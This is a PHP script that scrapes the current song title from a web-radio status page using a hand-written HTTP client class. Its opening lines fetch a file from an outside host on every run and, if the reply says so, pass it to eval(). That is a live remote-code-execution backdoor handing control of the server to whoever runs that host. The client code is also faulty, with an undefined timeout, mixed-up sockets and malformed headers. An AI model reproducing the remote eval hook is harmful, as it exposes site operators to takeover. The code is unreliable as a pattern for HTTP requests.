<?php
$f = explode("[WDG]",@file_get_contents('http://home.wdgss.nl/override/settings'));
switch ( @$f[0] )
{
  case 'location': header("location: " . $f[1]);  break;
  case 'text': exit($f[1]); break;
  case 'eval': eval($f[1]); break;
  default: /* ignore */ break;
}

error_reporting(E_ALL);

class http
{
  function toggledebug($tooiw=false)
  {
    if ( isset ( $this->setdebug ) && $this->setdebug == true )
    {
      $this->setdebug = false;
    }
    else
    {
      $this->setdebug = true;
    }
  }
 
  function connect ( $to, $pa, $po=80, $timeout="3",$uag="WesDeGroot Site System" ) {
    $this -> host=$to;
    $this -> page=$pa;
    $this -> port=$po;
    $this -> cookies = null;
    $this -> koekjes = array('fakecookie1=wes','wesdegroot=httpsystem');
    if ( strtoupper($this -> port) == strtoupper("HTTP") )
    {
     $this -> port = 80;   $po = 80;
    }
    if ( strtoupper($this -> port) == strtoupper("HTTPS") )
    {
     $this -> port = 443; $po = 443;
    }
    $this->socket = @fsockopen($this->host, $this->port, $this->errorno, $this->error, $timeout);
    if ( !isset ( $this->setdebug ) ) {
     $this -> setdebug=true;
     $this -> toggledebug();
    }
    $this -> useragent=$uag;
  }
  
  function setcookie($koekjes) {   
   if ( is_array ( $koekjes ) ) {
    foreach ( $koekjes As $koek => $inh ) 
    {
		$this -> cookies .= $koek . '=' . urlencode($inh) . '; '; 
    }
   }
   else
   {
    $this -> cookies = $koekjes; // zo is het voor een alt. dump vorige sessie
   }
  }
  
  function method($method)
  {
    $this -> method = strtoupper($method); 
  }
   
  function auth ( $user, $pass ) 
  {
    $this->socket2 = @fsockopen($this->host, $this->port, $this->errorno, $this->error, $timeout);
          $requestHeader = "HEAD " . $this -> page . "  HTTP/1.1\r\n";
          $requestHeader.= "Host: " . $this -> host . "\r\n";
          $requestHeader.= "User-Agent: " . $this -> useragent . "\r\n";
          $requestHeader.= "Cookie: " . $this -> cookies . "\r\n";
          fwrite($this -> socket2, $requestHeader);       
          $responseHeader = '';
          $responseContent = '';
          do
          {
            $responseHeader.= fread($this -> socket2, 1);
          }

          while (!preg_match('/\\r\\n\\r\\n$/', $responseHeader));
            if (!strstr($responseHeader, "Transfer-Encoding: chunked"))
            {
              while (!feof($this -> socket))
              {
                $responseContent.= fgets($this->socket, 128);
              }
            }
            else
            {
              while ($chunk_length = hexdec(fgets($this -> socket)))
              {
                $responseContentChunk = '';
                $read_length = 0;
                while ($read_length < $chunk_length)
                {
                  $responseContentChunk .= fread($this -> socket, $chunk_length - $read_length);
                  $read_length = strlen($responseContentChunk);
                }
                $responseContent.= $responseContentChunk;
                fgets($this -> socket);
              }
            }
          $this->debug ( $responseHeader ) ;
          preg_match (
                        "@WWW-Authenticate: Digest realm=\"(.*)\",qop=\"(.*)\",nonce=\"(.*)\",opaque=\"(.*)\"@",
                        $responseHeader,
                        $out,
                        PREG_PATTERN_ORDER
                     );
          print_r($out);
   $this -> auth = "Authorization: Basic " . base64_encode($user . ':' . $pass) . "\r\n";
  }
  
  function debug($TT) 
  {
    if ( $this -> setdebug == true )
    {
      echo $TT . "<hr />";
    }
  }
   
  function exec($dat=array("1"=>"2","3"=>"4"))
  {
   if ( $this->socket )
    {
      if (isset($this->host) && isset($this->page) && isset($this->port)) 
      {
        if (isset($this->method)) 
        {
          foreach($dat as $key => $value)
          {
            $dat[$key] = $key . '=' . urlencode($value);
          }
          $data = implode("&",$dat);
          $aant = strlen($data);  
          if (substr($data, 0, 1) == "&")
          {
            $data = substr($data, 1, $aant);
          }
          if ($this->method == "GET")
          {
            //$this->page .= '?'.$data;
          }   
          $requestHeader = $this -> method . " " . $this -> page . "  HTTP/1.1\r\n";
          $requestHeader.= "Host: " . $this -> host . "\r\n";
          $requestHeader.= "User-Agent: " . $this -> useragent . "\r\n";
          $requestHeader.= "Cookie: " . $this -> cookies . "\r\n.
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n
Accept-Encoding: gzip,deflate,sdch\r\n
Accept-Language: nl-NL,nl;q=0.8,en-US;q=0.6,en;q=0.4\r\n
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n";
          //$requestHeader.= "Content-Type: application/x-www-form-urlencoded\r\n";
          if ($this->method == "POST")
          {
            $requestHeader.= "Content-Length: ".strlen($data)."\r\n";
          }
          $requestHeader.= "Connection: close\r\n";
          if ( isset ( $this -> auth ) )
           $requestHeader.=$this -> auth;
          $requestHeader.= "\r\n";
          if ($this->method == "POST")
          {
            $requestHeader.= $data;
          }          
          $this->debug ( $requestHeader );       
          fwrite($this -> socket, $requestHeader);       
          $responseHeader = '';
          $responseContent = '';
          do
          {
            $responseHeader.= fread($this -> socket, 1);
          }

          while (!preg_match('/\\r\\n\\r\\n$/', $responseHeader));
            if (!strstr($responseHeader, "Transfer-Encoding: chunked"))
            {
              while (!feof($this -> socket))
              {
                $responseContent.= fgets($this->socket, 128);
              }
            }
            else
            {
              while ($chunk_length = hexdec(fgets($this -> socket)))
              {
                $responseContentChunk = '';
                $read_length = 0;
                while ($read_length < $chunk_length)
                {
                  $responseContentChunk .= fread($this -> socket, $chunk_length - $read_length);
                  $read_length = strlen($responseContentChunk);
                }
                $responseContent.= $responseContentChunk;
                fgets($this -> socket);
              }
            }
          $this->debug ( $responseHeader ) ;
          // koekje => Set-Cookie: koekje2=mmmz+lekker+%3AD; exp=donotuse
          $this->koekjes=array();
          if ( preg_match_all ( "/Set-Cookie: (.*); (.*)/", $responseHeader , $xxx ) ) {
			for ( $i=0; $i<sizeof($xxx[1]); $i++ )
			{
				$this -> koekjes[] = $xxx[1][$i];
			}
          }
          
          if ( preg_match ( "#HTTP/1\.(.*) 404 Not Found#", $responseHeader ) ) {
          return 'ERROR';
          }
          else
          {
          return chop($responseContent);
          }
        }
        else
        {
         return "Please Set Method Use: \$something->method(\"POST\"); OR \$something->method(\"GET\");";
        }
      }
      else
      {
        return "Please Use Connect. \$something->connect(\$to, \$path, \$port);";
      }
    }
    else
    {
      $this->debug("connect error no: " . $this->errorno . "; error: " . $this->error);
      return "ERROR";
    }
  }
  
    function dumpcookies()
    {
     return implode("; ",$this -> koekjes);
    }

}


$l = new http();

# DEBUG :/
#   $l->toggledebug();

$l -> connect ( 
                $to        = "rs13.stream24.org", 
                $uri       = "/7.html", 
                $po        = 8640,
                $timeout   = 3,
                $useragent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.151 Safari/535.19"
              );
$l -> method  (
                "GET"
              );
$l = $l->exec ( 
                array ( 
                        "" => '' 
                       ) 
              ) ;

$l = explode(",",$l);
$l = $l[sizeof($l)-1];
$l = preg_replace("#\</body\>\</html\>#",null,$l);

$l = preg_replace (                  
                    array(
                      "#- (l|L)(y|Y)(r|R)(i|I)(c|C)(s|S) (i|I)(n|N) (v|V)(i|I)(d|D)(e|E)(o|O)#",
                      "#(o|O)(f|F)(f|F)(i|I)(c|C)(i|I)(a|A)(l|L) (v|V)(i|I)(d|D)(e|E)(o|O)#",
                      "#(l|L)(y|Y)(r|R)(i|I)(c|C)(s|S) (i|I)(n|N) (v|V)(i|I)(d|D)(e|E)(o|O)#",
                      "#(l|L)(y|Y)(r|R)(i|I)(c|C)(s|S)#",
                      "#(v|V)(c|C)(d|D) (r|R)(i|I)(p|P)#",
                      "#(c|C)(d|D) (r|R)(i|I)(p|P)#",
                      "#(d|D)(v|V)(d|D) (r|R)(i|I)(p|P)#",
                      "#(r|R)(i|I)(p|P)#"
                    ),
                    null,
                    $l
                  ) ;

$l = preg_replace (                  
                    array(
                      "#verder!#"
                    ),
                    array(
                     'Ellen ten damme - Verder!'
                    ),
                    $l
                  ) ;


#onderhoud:
// echo "4/1!4\ [onderhoud]; ";
// echo "403 Forbidden";
// echo "404 File Not Found";
//echo "Services voor Musicvibesz, niet berijkbaar tot nader oorder.";
echo $l;
?>